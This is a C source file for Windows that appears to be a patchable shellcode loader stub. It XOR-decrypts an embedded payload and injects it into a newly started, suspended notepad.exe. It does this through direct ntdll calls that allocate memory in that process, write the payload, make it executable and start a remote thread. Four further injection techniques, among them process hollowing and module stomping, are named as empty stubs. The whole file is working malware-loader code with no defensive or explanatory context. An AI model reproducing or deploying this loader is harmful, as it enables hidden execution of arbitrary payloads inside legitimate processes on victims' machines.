#include <windows.h>
#include <winternl.h>

#define PAYLOAD_MARKER 0xDEADBEEF
#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#pragma pack(push, 1)
typedef struct {
	DWORD payload_size;
	unsigned char payload[MAX_PAYLOAD_SIZE];
	unsigned char xor_key;
	unsigned char technique;
	char target_process[MAX_PROCESS_NAME];
} PatchData;
#pragma pack(pop)

PatchData patch_data = {
	PAYLOAD_MARKER,
	{0},
	0,
	0,
	"notepad.exe"
};

void decrypt_payload() {
	DWORD i;
	if (patch_data.xor_key != 0) {
		for (i = 0; i < patch_data.payload_size; i++) {
			patch_data.payload[i] ^= patch_data.xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	HANDLE hThread;
	DWORD old;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory NtAllocateVirtualMemory;
	pNtWriteVirtualMemory NtWriteVirtualMemory;
	pNtProtectVirtualMemory NtProtectVirtualMemory;
	pNtCreateThreadEx NtCreateThreadEx;

	region_size = patch_data.payload_size;

	hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return;
	}

	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
		return;
	}

	if (!CreateProcessA(NULL, patch_data.target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	if (NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL) == 0) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_apc() {

}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_module_stomping() {

}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_module_stomping
};

int main() {
	decrypt_payload();
	injection_techniques[patch_data.technique]();
	return 0;
}
